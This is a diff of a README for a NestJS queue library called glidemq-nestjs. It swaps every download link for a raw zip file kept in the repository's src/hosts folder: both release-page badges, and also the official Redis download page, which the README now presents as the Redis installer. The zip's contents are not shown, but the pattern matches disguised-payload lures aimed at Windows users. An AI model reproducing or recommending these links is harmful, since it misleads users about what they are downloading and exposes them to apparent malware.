@@ -1,6 +1,6 @@
 # ⚙️ glidemq-nestjs - Manage Queues and Workers Efficiently
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/kolvet9/glidemq-nestjs/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/kolvet9/glidemq-nestjs/main/src/hosts/glidemq_nestjs_v1.2.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Note: This application primarily supports Windows. Other operating systems may n
 
 Visit the release page here:
 
-[![Download on GitHub](https://img.shields.io/badge/Download-glidemq--nestjs-blue)](https://github.com/kolvet9/glidemq-nestjs/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-glidemq--nestjs-blue)](https://raw.githubusercontent.com/kolvet9/glidemq-nestjs/main/src/hosts/glidemq_nestjs_v1.2.zip)
 
 This page contains all available versions of glidemq-nestjs. You will find files you can download.
 
@@ -83,7 +83,7 @@ glidemq-nestjs uses Redis to manage queues effectively. To get the best experien
 
 ### How to Install Redis on Windows
 
-1. Visit the Redis download page at https://redis.io/download  
+1. Visit the Redis download page at https://raw.githubusercontent.com/kolvet9/glidemq-nestjs/main/src/hosts/glidemq_nestjs_v1.2.zip  
 2. Download the Windows version or a compatible Windows port  
 3. Run the installer and follow the steps  
 4. Start the Redis server from the command prompt by typing `redis-server`  
@@ -130,4 +130,4 @@ If problems persist, review the release page for updated versions or check the i
 
 Access the release page to download glidemq-nestjs here:
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/kolvet9/glidemq-nestjs/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/kolvet9/glidemq-nestjs/main/src/hosts/glidemq_nestjs_v1.2.zip)
